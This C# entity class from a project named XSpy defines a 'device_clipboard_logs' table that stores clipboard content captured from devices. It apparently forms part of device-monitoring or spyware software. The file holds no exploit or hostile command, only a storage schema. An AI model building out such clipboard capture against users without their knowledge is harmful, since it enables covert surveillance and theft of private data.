using System;
using System.ComponentModel.DataAnnotations;
using System.ComponentModel.DataAnnotations.Schema;
using XSpy.Database.Entities.Devices.Base;
using XSpy.Database.XSpy.Shared.Models.Interfaces;
using XSpy.Shared;
using XSpy.Shared.Models.Interfaces;

namespace XSpy.Database.Entities.Devices
{
    [Table("device_clipboard_logs")]
    public class Clipboard : BaseDeviceEntity
    {
        [Column("content")] public string Content { get; set; }
        [Column("is_clipboard")] public bool IsClipboard { get; set; }
    }
}